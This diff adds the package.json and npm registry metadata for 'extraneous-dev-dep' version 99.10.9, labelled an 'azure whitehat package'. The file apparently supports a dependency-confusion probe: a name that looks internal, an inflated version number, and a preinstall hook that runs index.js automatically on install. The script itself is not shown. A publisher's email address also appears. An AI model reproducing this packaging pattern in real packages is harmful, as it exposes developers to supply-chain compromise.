@@ -1,0 +1,39 @@
+{
+    "name": "extraneous-dev-dep",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "extraneous-dev-dep@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-TDfZM6pw8bxMH5rmBKEVVta3M0D3ZuOToIOkPxo7wMtQ1NrgsHW84+SfBOx1W+jsBcQJzz2RQaZinL1+jccvLA==",
+        "shasum": "00b1cf208594f1e65decab16012a7cdbf19c5d50",
+        "tarball": "https://registry.npmjs.org/extraneous-dev-dep/-/extraneous-dev-dep-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3582,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRGuCRA9TVsSAnZWagAAY90P/RHT6t/gCriJj8RRNkmt\nmU5Wb5V+ObLnDnBpzn99pNAsaHywW6r3qMEWgBf8U17J4YcyeGL+bYZUFsPZ\n9EjaTp01M4zf5ibBbp7Ii17O2QPG1tikhFjd/FmEouRSVOEj7RphKz8pWxvI\n1HSOT7mhE+rbx/FZT+3Lmh4pJBwd2HTB0CloUT1tEFex3dzBdsQnZaHM5SXe\nu8mAsYbFULXZ+mTX4wk2BN2ZZ2UCacf0FQQhOxSmgcSgPuvYtTn5nQ1gVEBP\nWoz7bqQOpp7z7UL4lIM6pBGovi6dxP0qZ++w2gisD8lNySiaQRTr2WGAIIoO\nfUoUKEGQjuCJ3Q0nOBxugwC4UE+gJX4XA9m4JdKHI/WPuhNJcQmy/7NY+iGU\npM7Zo3EWuG+TiQxm4+P1cAajkRkzOywxEm4UxdMF6nRdly5WIQBVo7L7DOZM\n/0dzHWwVkc7/t7kqWf5EH8ckMzMsnE7LThkNKOK+eokfiW0yrp6yECk3twHq\npcpoPT76vZwXc5eg1mUpfbWwOCB2MFTE9hN+LWe2nC1iVlJTVWYmtkIL4WaR\nRLjZRI2WhHYb/96kSAM6JN4YE2PaxNC06taBCoGcFUeHGDh/oudVSIR9deaU\naX6FUU7uyOtVsHGpr1p6GsNUhzxC2MgLwUCT0COREzzqnFddo/+4Ak7CSFX+\nd2hh\r\n=qiTG\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/extraneous-dev-dep_99.10.9_1637945774547_0.45617941759477754"
+    },
+    "_hasShrinkwrap": false
+}
